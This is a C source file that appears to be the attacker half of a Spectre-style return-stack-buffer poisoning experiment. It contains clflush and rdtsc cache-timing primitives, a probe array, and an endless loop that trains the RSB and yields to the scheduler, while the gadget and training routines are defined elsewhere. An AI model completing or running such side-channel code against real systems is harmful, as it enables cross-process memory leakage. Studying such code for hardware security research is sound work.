#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
// // 
// #include "a.h"

size_t CACHE_MISS = 250;

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void maccess_wr(void *p, int val) { asm volatile("movq %%rax, (%1)\n" : : "a"(val), "c"(p) : ); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void lfence() { asm volatile("lfence"); }

__attribute__((always_inline)) inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    asm volatile("mfence");

    return (d << 32) | a;
}

int foo(int a, int b){
    int c = a + b * 2 + 1;
    return c;
}


extern void do_nothing();
extern void do_something();
extern void  train_rsb();
extern uint8_t gadget();

extern char probe_array[256 * 4096];

int main(){


    // write probe_array to avoid page fault
    for(int i = 0; i < 256; i++){
        probe_array[i * 4096] = 1;
    }

    // check the address of gadget
    printf("gadget: %p\n", gadget);
 
    // constantly train the RSB, every time the RSB is trained, sched is called
    while(1){
        train_rsb();
        sched_yield();
    }
    

    return 0;
}


